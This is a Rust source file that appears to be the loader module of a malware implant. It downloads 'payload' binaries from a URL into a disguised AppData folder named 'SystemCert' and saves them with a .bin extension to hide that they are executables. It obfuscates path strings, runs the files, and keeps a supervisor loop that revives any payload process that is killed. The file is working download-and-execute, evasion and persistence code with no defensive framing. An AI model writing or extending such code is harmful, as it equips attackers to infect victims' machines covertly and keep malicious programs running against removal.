use std::path::PathBuf;
use std::process::Command;
use crate::utils::paths::get_userprofile;
use obfstr::obfstr;
use reqwest;
use std::fs;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use once_cell::sync::Lazy;
use std::time::Duration;
use tokio::time::sleep;

// --- Plugin State Management ---

#[derive(Clone)]
struct PluginState {
    path: PathBuf,
    args: String,
    pid: u32,
}

// Global Registry of Active Plugins (The "Life Support" List)
static ACTIVE_PLUGINS: Lazy<Arc<Mutex<HashMap<String, PluginState>>>> = Lazy::new(|| {
    Arc::new(Mutex::new(HashMap::new()))
});

pub async fn start_supervisor() {
    println!("Plugin Supervisor started.");
    let plugins = ACTIVE_PLUGINS.clone();

    loop {
        // 1. Snapshot current state to avoid holding lock during checks
        let mut check_list: Vec<(String, PathBuf, String, u32)> = Vec::new();
        {
            let lock = plugins.lock().unwrap();
            for (name, state) in lock.iter() {
                check_list.push((name.clone(), state.path.clone(), state.args.clone(), state.pid));
            }
        } // Lock released

        // 2. Check each plugin
        let mut updates: Vec<(String, u32)> = Vec::new();

        for (name, path, args, pid) in check_list {
            if !is_process_alive(pid) {
                println!("! Plugin '{}' (PID: {}) died. Reviving...", name, pid);
                
                // Respawn
                match spawn_process(&path, &args) {
                    Ok(new_pid) => {
                        println!("+ Plugin '{}' revived with PID: {}", name, new_pid);
                        updates.push((name, new_pid));
                    }
                    Err(e) => {
                        eprintln!("- Failed to revive plugin '{}': {}", name, e);
                    }
                }
            }
        }

        // 3. Update State with new PIDs
        if !updates.is_empty() {
            let mut lock = plugins.lock().unwrap();
            for (name, new_pid) in updates {
                if let Some(state) = lock.get_mut(&name) {
                    state.pid = new_pid;
                }
            }
        }

        sleep(Duration::from_secs(5)).await;
    }
}

// Helper: Check if process exists
#[cfg(windows)]
fn is_process_alive(pid: u32) -> bool {
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::winnt::PROCESS_QUERY_INFORMATION;
    use winapi::um::handleapi::CloseHandle;
    use std::ptr;

    unsafe {
        let handle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
        if handle == ptr::null_mut() {
            return false;
        }
        CloseHandle(handle);
        true
    }
}

#[cfg(not(windows))]
fn is_process_alive(pid: u32) -> bool {
    // Linux check: /proc/PID exists
    std::path::Path::new(&format!("/proc/{}", pid)).exists()
}

// --- Loader Actions ---

pub async fn download_payload(url: &str, name: &str) -> Result<PathBuf, Box<dyn std::error::Error>> {
    let save_dir = get_userprofile()
        .join(obfstr!("AppData"))
        .join(obfstr!("Local"))
        .join(obfstr!("SystemCert")); // Disguised Folder

    if !save_dir.exists() {
        fs::create_dir_all(&save_dir)?;
    }
    
    // Obfuscate extension (e.g., .dat or .bin instead of .exe)
    let file_name = format!("{}.bin", name);
    let file_path = save_dir.join(&file_name);
    
    println!("Downloading module '{}' from '{}'...", name, url);
    
    let response = reqwest::get(url).await?;
    if !response.status().is_success() {
        return Err(format!("Download failed: {}", response.status()).into());
    }
    
    let content = response.bytes().await?;
    fs::write(&file_path, &content)?;
    
    println!("Module saved to: {}", file_path.display());
    Ok(file_path)
}

fn spawn_process(path: &PathBuf, args_str: &str) -> Result<u32, Box<dyn std::error::Error>> {
    let args: Vec<&str> = args_str.split_whitespace().collect();
    // Ensure executable permission on Linux
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(path)?.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(path, perms)?;
    }

    let child = Command::new(path)
        .args(&args)
        .spawn()?;
    Ok(child.id())
}

pub fn execute_payload(name: &str, args: &str) -> Result<u32, Box<dyn std::error::Error>> {
    let save_dir = get_userprofile()
        .join(obfstr!("AppData"))
        .join(obfstr!("Local"))
        .join(obfstr!("SystemCert"));

    let file_path = save_dir.join(format!("{}.bin", name));
    
    if !file_path.exists() {
        return Err(format!("Module '{}' not found. Load it first.", name).into());
    }
    
    println!("Executing module: {} {}", file_path.display(), args);
    
    // 1. Spawn
    let pid = spawn_process(&file_path, args)?;

    // 2. Register for Supervision
    let mut lock = ACTIVE_PLUGINS.lock().unwrap();
    lock.insert(name.to_string(), PluginState {
        path: file_path,
        args: args.to_string(),
        pid,
    });
        
    Ok(pid)
}

pub fn stop_payload(name: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut lock = ACTIVE_PLUGINS.lock().unwrap();
    
    if let Some(state) = lock.remove(name) {
        println!("Stopping module '{}' (PID: {})...", name, state.pid);
        
        // Kill Process
        #[cfg(windows)]
        unsafe {
            use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
            use winapi::um::winnt::PROCESS_TERMINATE;
            use winapi::um::handleapi::CloseHandle;
            
            let handle = OpenProcess(PROCESS_TERMINATE, 0, state.pid);
            if !handle.is_null() {
                TerminateProcess(handle, 1);
                CloseHandle(handle);
            }
        }
        
        #[cfg(not(windows))]
        {
             let _ = Command::new("kill").arg(state.pid.to_string()).output();
        }

        Ok(())
    } else {
        Err(format!("Module '{}' is not running.", name).into())
    }
}
